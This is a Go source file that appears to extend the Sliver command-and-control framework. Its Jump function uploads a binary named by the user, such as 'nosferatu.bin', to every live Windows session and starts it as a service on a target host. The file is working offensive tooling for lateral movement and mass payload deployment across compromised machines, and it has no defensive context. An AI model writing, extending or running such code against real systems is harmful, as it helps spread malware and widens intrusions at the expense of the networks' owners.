package dispatch

import (
	"context"
	"fmt"
	"os"
	"sliver-dispatch/utils"
	"strings"

	"github.com/bishopfox/sliver/protobuf/clientpb"
	"github.com/bishopfox/sliver/protobuf/commonpb"
	"github.com/bishopfox/sliver/protobuf/rpcpb"
	"github.com/bishopfox/sliver/protobuf/sliverpb"
)

func Jump(rpc rpcpb.SliverRPCClient, args ...string) {

	if len(args) < 1 {
		utils.Eprint("Need the full path to nosferatu.bin")
		return
	}

	b_svc, err := os.ReadFile(args[0])
	if err != nil {
		utils.Eprint("Error reading file: %s", err.Error())
		return
	}
	var sessions *clientpb.Sessions

	sessions, err = rpc.GetSessions(context.Background(), &commonpb.Empty{})
	if err != nil {
		utils.Eprint("Error listing sessions: %s", err.Error())
	}

	var session *clientpb.Session
	var svc_resp *sliverpb.ServiceInfo
	for _, session = range sessions.GetSessions() {
		if !session.IsDead && session.OS == "windows" {

			utils.Iprint(fmt.Sprintf("==| ID: %-10s | Host: %-20s | Address: %-15s | Username: %-10s |==",
				strings.Split(session.ID, "-")[0],
				session.Hostname,
				strings.Split(session.RemoteAddress, ":")[0],
				session.Username))

			upload_rsp, err := rpc.Upload(
				context.Background(), &sliverpb.UploadReq{
					Path:    args[3],
					Data:    b_svc,
					IsIOC:   false,
					Encoder: "",
					Request: &commonpb.Request{
						Async:     false,
						SessionID: session.ID,
					},
				})
			if err != nil {
				utils.Eprint("Error: " + err.Error())
			}
			if upload_rsp != nil {
				if upload_rsp.Response != nil {
					if upload_rsp.Response.Err != "" {
						utils.Eprint("Error: " + upload_rsp.Response.Err)
					}
				}
			}
			svc_resp, err = rpc.StartService(
				context.Background(),
				&sliverpb.StartServiceReq{
					ServiceName:        args[2],
					ServiceDescription: "",
					BinPath:            args[3],
					Hostname:           args[1],
					Arguments:          "",
					Request: &commonpb.Request{
						Async:     false,
						SessionID: session.ID,
					},
				})
			if err != nil {
				utils.Eprint("Error: " + err.Error())
			}
			if svc_resp != nil {
				if svc_resp.Response != nil {
					if svc_resp.Response.Err != "" {
						utils.Eprint("Error: " + svc_resp.Response.Err)
					}
				}
			}
		}
	}
}
